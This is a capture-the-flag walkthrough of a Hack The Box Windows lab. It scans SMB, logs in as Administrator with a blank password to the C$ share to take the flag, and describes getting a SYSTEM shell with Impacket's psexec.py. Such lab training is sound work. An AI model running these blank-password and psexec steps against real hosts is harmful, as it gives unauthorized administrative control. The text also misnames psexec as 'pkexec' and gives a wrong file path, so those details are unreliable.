#protocols #smb #reconnaissance #misconfiguration 

# 0. Theory

**Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?**
*-Pn*

**What does the 3-letter acronym SMB stand for?**
*Server Message Block*

**What port does SMB use to operate at?**
*445*

**What command line argument do you give to `smbclient` to list available shares?**
*-L*

**What character at the end of a share name indicates it's an administrative share?**
*$*

**What command can we use to download the files we find on the SMB Share?**
*get*

**Which tool that is part of the Impacket collection can be used to get an interactive shell on a system?**
*psexec.py*


# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-jsravz8vnp]─[~]
	└──╼ [★]$ ping 10.129.69.127 -c 4
	PING 10.129.69.127 (10.129.69.127) 56(84) bytes of data.
	64 bytes from 10.129.69.127: icmp_seq=1 ttl=127 time=8.53 ms
	64 bytes from 10.129.69.127: icmp_seq=2 ttl=127 time=8.29 ms
	64 bytes from 10.129.69.127: icmp_seq=3 ttl=127 time=8.70 ms
	64 bytes from 10.129.69.127: icmp_seq=4 ttl=127 time=8.35 ms
	
	--- 10.129.69.127 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3003ms
	rtt min/avg/max/mdev = 8.287/8.465/8.695/0.160 ms

# 2. Enumeration

Instead of the `-sV` service detection option, we use `-Pn` for the `nmap` scan.
During a typical `nmap` scan, the `nmap` script will perform a form of complex ping scan, which most Firewalls are set to deny automatically, without question. Repeated denials will raise suspicion, and during a typical scan, a lot of the same requests will get denied. The `-Pn` flag will skip the host discovery phase and move on straight to other probe types, silencing our active scanning to a degree.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-jsravz8vnp]─[~]
	└──╼ [★]$ nmap -sC -Pn 10.129.69.127
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 10:27 CDT
	Nmap scan report for 10.129.69.127
	Host is up (0.0081s latency).
	Not shown: 997 filtered tcp ports (no-response)
	PORT    STATE SERVICE
	135/tcp open  msrpc
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds
	
	Host script results:
	| smb2-time: 
	|   date: 2024-09-22T15:27:28
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	
	Nmap done: 1 IP address (1 host up) scanned in 45.10 seconds


We can see that the target machine is running the Windows and the Server Message Block service on `port 445`.

It's worth noting what the available ports are for:

	Port 135:
	The Remote Procedure Call (RPC) service supports communication between Windows applications. Specifically, the service implements the RPC protocol — a low-level form of inter-process communication where a client process can make requests of a server process. Microsoft’s foundational COM and DCOM technologies are built on top of RPC. The service’s name is RpcSs and it runs inside the shared services host process, svchost.exe. This is one of the main processes in any Windows operating system & it should not be terminated.
	
	Port 139:
	This port is used for NetBIOS. NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network. As strictly an API, NetBIOS is not a networking protocol. Older operating systems ran NetBIOS over IEEE 802.2 and IPX/SPX using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols, respectively. In modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name. NetBIOS is also used for identifying system names in TCP/IP(Windows). Simply saying, it is a protocol that allows communication of files and printers through the Session Layer of the OSI Model in a LAN.
	
	Port 445:
	This port is used for the SMB. SMB is a network file sharing protocol that requires an open port on a computer or server to communicate with other systems. SMB ports are generally port numbers 139 and 445. Port 139 is used by SMB dialects that communicate over NetBIOS. It's a session layer protocol designed to use in Windows operating systems over a local network. Port 445 is used by newer versions of SMB (after Windows 2000) on top of a TCP stack, allowing SMB to communicate over the Internet. This also means you can use IP addresses in order to use SMB like file sharing. Simply saying, SMB has always been a network file sharing protocol. As such, SMB requires network ports on a computer or server to enable communication to other systems. SMB uses either IP port 139 or 445.

Since SMB (Server Message Block) is a file sharing protocol, we might be able to extract some useful byproducts by exploring it.
We can use the `smbclient` tool, which comes pre-installed on every Parrot OS and Kali Linux, but can be installed with the following command:

	sudo apt install smbclient

We can check the help menu to find what kind of switches could be useful for us (`smbclient -h`).
The complete manual can be read by executing the `man smbclient` command.

In this scenario, we want to list the available shares (`-L`) and want to attempt a login as the `Administrator` account, which is the high privilege standard account for the Windows OS.
Typically, the SMB server will request a password, but since we want to test for every possible misconfigurations, we can attempt a passwordless login. - Just hitting the Enter key when prompted for the `Administrator` password will send a blank input to the server. We will discover whether it will be accepted or not.

Flags relevant for this scenario:
	-L : List available shares on the target.
	-U : Login identity to use.


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-jsravz8vnp]─[~]
	└──╼ [★]$ smbclient -L 10.129.69.127 -U Administrator
	Password for [WORKGROUP\Administrator]:
	
		Sharename       Type      Comment
		---------       ----      -------
		ADMIN$          Disk      Remote Admin
		C$              Disk      Default share
		IPC$            IPC       Remote IPC
	Reconnecting with SMB1 for workgroup listing.
	do_connect: Connection to 10.129.69.127 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Unable to connect with SMB1 -- no workgroup available


# 3. Foothold

From here we have two options of attack. One is loud, one is not.

- *Smbclient simple navigation to C$ share with Administrator authorization.*
- *PSexec.py from Impacket, involving Impacket installation and common attack surface, big fingerprinting.*

## Option A: SMB Unprotected C$ Share

We can access the `ADMIN$` share on the target machine:

	smbclient \\\\10.129.163.64\\ADMIN$ -U Administrator

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-lnh2wl9rnq]─[~]
	└──╼ [★]$ smbclient \\\\10.129.163.64\\ADMIN$ -U Administrator
	Password for [WORKGROUP\Administrator]:
	Try "help" to get a list of possible commands.
	smb: \>

But we can also access th `C$` share as well instead, which is the file system of the Windows machine.
After executing the `dir` command to look around on the C drive, we find the `Users` directory.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-lnh2wl9rnq]─[~]
	└──╼ [★]$ smbclient \\\\10.129.163.64\\C$ -U Administrator
	Password for [WORKGROUP\Administrator]:
	Try "help" to get a list of possible commands.
	smb: \> dir
	  $Recycle.Bin                      DHS        0  Wed Apr 21 10:23:49 2021
	  Config.Msi                        DHS        0  Wed Jul  7 13:04:56 2021
	  Documents and Settings          DHSrn        0  Wed Apr 21 10:17:12 2021
	  pagefile.sys                      AHS 738197504  Mon Sep 23 04:50:13 2024
	  PerfLogs                            D        0  Sat Sep 15 02:19:00 2018
	  Program Files                      DR        0  Wed Jul  7 13:04:24 2021
	  Program Files (x86)                 D        0  Wed Jul  7 13:03:38 2021
	  ProgramData                        DH        0  Tue Sep 13 11:27:53 2022
	  Recovery                         DHSn        0  Wed Apr 21 10:17:15 2021
	  System Volume Information         DHS        0  Wed Apr 21 10:34:04 2021
	  Users                              DR        0  Wed Apr 21 10:23:18 2021
	  Windows                             D        0  Wed Jul  7 13:05:23 2021
	
			3774463 blocks of size 4096. 1157853 blocks available

It's just a matter of sniffing around to finally locate the flag on the target machine:

	smb: \> cd Users\Administrator\Desktop\
	smb: \Users\Administrator\Desktop\> dir
	  .                                  DR        0  Thu Apr 22 02:16:03 2021
	  ..                                 DR        0  Thu Apr 22 02:16:03 2021
	  desktop.ini                       AHS      282  Wed Apr 21 10:23:32 2021
	  flag.txt                            A       32  Fri Apr 23 04:39:00 2021
	
			3774463 blocks of size 4096. 1158889 blocks available

In order to retrieve it, we can use the `get` command.
This will initialize a download with the output location being our last visited directory on our attacker VM at the point of running the `smbclient` tool.

	smb: \Users\Administrator\Desktop\> get flag.txt 
	getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
	smb: \Users\Administrator\Desktop\> ^C
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-lnh2wl9rnq]─[~]
	└──╼ [★]$ ls -la
	total 2389
	drwx------ 24 scrage scrage    4096 Sep 23 05:17 .
	drwxr-xr-x  5 root   root      4096 Sep 23 04:49 ..
	[ *** SNIP ***]
	-rw-r--r--  1 scrage scrage      32 Sep 23 05:17 flag.txt
	
	[ *** SNIP ***]
	
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-lnh2wl9rnq]─[~]
	└──╼ [★]$ cat flag.txt 
	f751c19eda8f61ce81827e6930a1f40c

Flag exfiltrated: `f751c19eda8f61ce81827e6930a1f40c`


## Option B: Impacket

We managed to get the SMB command-line interactive interface. However, since we can access this `ADMIN$` share, we will try to use a tool called `psexec.py` to exploit this misconfiguration & get the interactive system shell. The `psexec.py` is part of the Impacket framework.

Impacket is a framework written in Python for working with network protocols. It is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB and MSRPC) the protocol implementation itself. In short, Impacket contains dozens of amazing tools for interacting with windows systems and applications, many of which are ideal for attacking Windows and Active Directory.

One of the most commonly used tools in impacket is `psexec.py`. It is named after the utility, PsExec from Microsoft’s Sysinternals suite since it performs the same function of enabling us to execute a fully interactive shell on remote Windows machines.

>*PsExec is a portable tool from Microsoft that lets you run processes remotely using any user's credentials. It’s a bit like a remote access program but instead of controlling the computer with a mouse, commands are sent via Command Prompt, without having to manually install client software.*

Impacket creates a remote service by uploading a randomly-named executable on the `ADMIN$` share on the remote system and then register it as a Windows service.This will result in having an interactive shell available on the remote Windows system via `TCP port 445`.
Psexec requires credentials for a user with local administrator privileges or higher since reading/writing to the ADMIN$ share is required. Once you successfully authenticate, it will drop us into a `NT AUTHORITY\SYSTEM` shell.

We can Download Impacket from [here](https://github.com/SecureAuthCorp/impacket).

Installation guide:

	git clone https://github.com/SecureAuthCorp/impacket.git
	cd impacket
	pip3 install .
	# OR:
	sudo python3 setup.py install
	# In case you are missing some modules:
	pip3 install -r requirements.txt

The `pkexec` utility can be found at `/impacket/examples/pkexec.py`.

The syntax for simply getting an interactive shell from a target :
`python psexec.py username:password@hostIP`

From the previous method in which we used `smbclient`, so we know that there is no password for the 'Administrator' user. So, the command we are going to run is:
`psexec.py administrator@10.129.163.64`
When it prompts for entering a password, we simply press enter.

We got the shell with the highest privileges, i.e. as user `NT Authority/System`.
Now, we can browse the file system and retrieve the flag.

However, using the `pkexec` utility is often preferred in simulated testing environments, but it can be easily detected by the Windows Defender in real-world assessments!



https://www.hackthebox.com/achievement/machine/2057492/407
![[Pasted image 20240923123633.png]]